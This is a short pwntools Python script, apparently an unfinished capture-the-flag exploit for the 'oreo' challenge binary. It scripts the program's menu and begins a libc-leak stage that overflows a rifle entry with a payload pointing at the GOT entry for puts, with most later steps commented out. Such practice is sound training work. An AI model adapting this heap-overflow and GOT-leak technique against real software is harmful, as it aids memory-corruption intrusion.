from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
elf = ELF("./oreo")
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    p = process("./oreo")
    # p.recv()
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
log.info('PID: ' + str(proc.pidof(p)[0]))

#gdb.attach(p)

def add(descrip, name):    
    p.sendline('1')
    p.recvuntil('Rifle name: ')
    p.sendline(name)
    p.recvuntil('Rifle description: ')
    #sleep(0.5)
    p.sendline(descrip)


def show_rifle():
    p.sendline('2')
    #p.recvuntil('===================================\n')


def order():
    p.sendline('3')


def message(notice):
    p.sendline('4')
    p.recvuntil("Enter any notice you'd like to submit with your order: ")
    p.sendline(notice)


def run():
    p.recvuntil("Action: ")
    #stage1:leak libc
    addr = 0x0804a248 #got.plt:[puts]
    payload = 'b' * 27 + p32(addr - 25)
    #add('a','b')
    #add('a',payload) #cover next pointer
    #show_rifle()
    #p.readline()
    raw_input()   

    #p.interactive()


if __name__ == "__main__":
    run()
